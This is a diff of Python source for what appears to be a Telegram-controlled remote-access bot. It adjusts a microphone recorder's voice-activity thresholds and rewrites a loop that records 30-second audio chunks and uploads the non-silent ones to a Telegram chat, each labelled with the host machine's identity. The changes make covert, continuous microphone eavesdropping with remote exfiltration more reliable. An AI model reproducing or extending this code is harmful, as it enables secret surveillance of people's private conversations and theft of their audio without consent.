@@ -1208,8 +1208,8 @@ class MicRecorder:
     SAMPLE_RATE   = 16000
     BLOCK_SIZE    = 1600     # callback block = 0.1 s  (low latency for stop)
     CHUNK_SECONDS = 30       # continuous-mode chunk length
-    VAD_THRESHOLD = 0.008    # normalised amplitude threshold  (0.0 – 1.0)
-    VAD_MIN_RATIO = 0.04     # fraction of samples that must exceed threshold
+    VAD_THRESHOLD = 0.003    # normalised amplitude threshold  (0.0 – 1.0)
+    VAD_MIN_RATIO = 0.02     # fraction of samples that must exceed threshold
 
     def __init__(self, logger: LogManager):
         self.logger     = logger
@@ -1768,10 +1768,13 @@ class TelegramBotManager:
                         bot.send_message(msg.chat.id,
                             "⚠️ Sürekli kayıt zaten aktif. Durdurmak için /mic off")
                         return
+                    if not self.mic_recorder.has_microphone():
+                        bot.send_message(msg.chat.id, "❌ Mikrofon bulunamadı")
+                        return
                     self._mic_stop_event.clear()
                     self._mic_continuous_active = True
                     bot.send_message(msg.chat.id,
-                        f"🎙️ Sürekli kayıt başlatıldı (1 dk'lık döngü)\n"
+                        f"🎙️ Sürekli kayıt başlatıldı (30s döngü, VAD aktif)\n"
                         f"{identity.display_name()}\n"
                         f"Durdurmak için: /mic off")
                     threading.Thread(
@@ -2266,57 +2269,62 @@ class TelegramBotManager:
         30 saniyelik VAD'lı sürekli kayıt döngüsü.
         stop_event record()'a geçirilir — /mic off anında etkili olur.
         """
-        chunk         = MicRecorder.CHUNK_SECONDS
-        segment       = 0
-        silent_streak = 0
-        SILENT_NOTIFY = 4   # 4 × 30 s = 2 dakika sessizlik bildirimi
+        chunk   = MicRecorder.CHUNK_SECONDS
+        segment = 0
 
-        while not self._mic_stop_event.is_set():
+        try:
+            while not self._mic_stop_event.is_set():
 
-            # stop_event'i record'a ver — kayıt ortasında kesilirse anında durur
-            result = self.mic_recorder.record(chunk, stop_event=self._mic_stop_event)
+                result = self.mic_recorder.record(chunk, stop_event=self._mic_stop_event)
 
-            if self._mic_stop_event.is_set():
-                break
+                if self._mic_stop_event.is_set():
+                    break
 
-            if result is None:
-                err = self.mic_recorder.last_error or "Bilinmeyen hata"
-                self.bot.send_message(chat_id,
-                    f"⚠️ Kayıt hatası: {err} — 3s sonra yeniden deneniyor")
-                time.sleep(3)
-                continue
+                if result is None:
+                    err = self.mic_recorder.last_error or "Bilinmeyen hata"
+                    self.logger.error(f"Mic continuous error: {err}")
+                    self.bot.send_message(chat_id,
+                        f"⚠️ Kayıt hatası: {err} — 3s sonra yeniden deneniyor")
+                    time.sleep(3)
+                    continue
 
-            buf, is_silent = result
+                buf, is_silent = result
+                self.logger.info(f"Mic chunk #{segment+1}: silent={is_silent} "
+                                 f"size={buf.getbuffer().nbytes//1024}KB")
 
-            if is_silent:
-                silent_streak += 1
-                self.logger.info(f"Mic chunk silent (streak {silent_streak})")
-                if silent_streak == SILENT_NOTIFY:
-                    self.bot.send_message(
-                        chat_id,
-                        f"🔇 {silent_streak * chunk}s sessizlik algılandı — kayıt devam ediyor"
+                if is_silent:
+                    # sessiz chunk — atla ama logla
+                    continue
+
+                segment += 1
+                buf.name = f"mic_{segment}.wav"
+                try:
+                    self.bot.send_audio(
+                        chat_id, buf,
+                        title=f"🎙️ #{segment} — {datetime.now().strftime('%H:%M:%S')}",
+                        performer=self.identity.display_name(),
+                        timeout=60
                     )
-                continue
+                except Exception as e:
+                    self.logger.error(f"Mic send error: {e}")
 
-            silent_streak = 0
-            segment += 1
-            buf.name = f"mic_{segment}.wav"
+        except Exception as e:
+            self.logger.error(f"Mic continuous loop crashed: {e}")
             try:
-                self.bot.send_audio(
-                    chat_id, buf,
-                    title=f"🎙️ #{segment} — {datetime.now().strftime('%H:%M:%S')}",
-                    performer=self.identity.display_name(),
-                    timeout=60
-                )
-            except Exception as e:
-                self.logger.error(f"Mic send error: {e}")
+                self.bot.send_message(chat_id, f"❌ Kayıt döngüsü çöktü: {e}")
+            except Exception:
+                pass
 
-        self._mic_continuous_active = False
-        self.bot.send_message(
-            chat_id,
-            f"🛑 Kayıt durduruldu — {segment} segment gönderildi\n"
-            f"{self.identity.display_name()}"
-        )
+        finally:
+            self._mic_continuous_active = False
+            try:
+                self.bot.send_message(
+                    chat_id,
+                    f"🛑 Kayıt durduruldu — {segment} segment gönderildi\n"
+                    f"{self.identity.display_name()}"
+                )
+            except Exception:
+                pass
 
     # ── Servisler ─────────────────────────────────────────────────────────────
 
